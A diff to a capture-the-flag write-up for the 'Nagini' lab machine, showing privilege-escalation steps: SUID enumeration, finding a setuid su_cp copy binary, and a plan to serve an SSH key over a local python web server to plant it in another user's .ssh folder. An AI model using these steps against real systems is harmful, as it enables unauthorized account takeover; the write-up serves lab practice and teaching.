@@ -214,3 +214,59 @@ ssh snape@quic.nagini.hogwarts
 ```
 
 ![Alt text](./img/sanpe.PNG?raw=true "SNAPE")
+
+I tried to check if we have sudo permission, but no, then I checked the system permission to run some code and found something interesting.
+
+In /home/hermoine/bin there is a su_cp.
+
+```bash
+snape@Nagini:~$ sudo -l
+-bash: sudo: command not found
+snape@Nagini:~$ find / -perm -u=s 2>/dev/null
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/home/hermoine/bin/su_cp
+
+```
+
+The **su_cp** command seems to copy a file from SOURCE to DEST.
+
+Navigating in /home/hermoine, I noted that there is .ssh folder which is empty.
+
+So i thought to upload a id_rsa using a webserver to snape home file and then using the su_cp to import it into /home/hermoine/.ssh
+
+Before doing it, I forgot to catch the 1st flag :D
+
+```bash
+snape@Nagini:~$ find / -name horcrux* 2>/dev/null
+/var/www/html/horcrux1.txt
+/home/hermoine/horcrux2.txt
+snape@Nagini:~$ cat /var/www/html/horcrux1.txt
+horcrux_{MzXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX9O}
+
+```
+
+**Let's move on....**
+
+Let's open a new terminal in our Hacking machine and go to the .ssh folder
+
+```bash
+cd ~/.ssh
+```
+
+Start a web server
+
+```bash
+python3 -m http.server 80
+```
+
+![Alt text](./img/http.PNG?raw=true "LOCAL WEB SERVER")
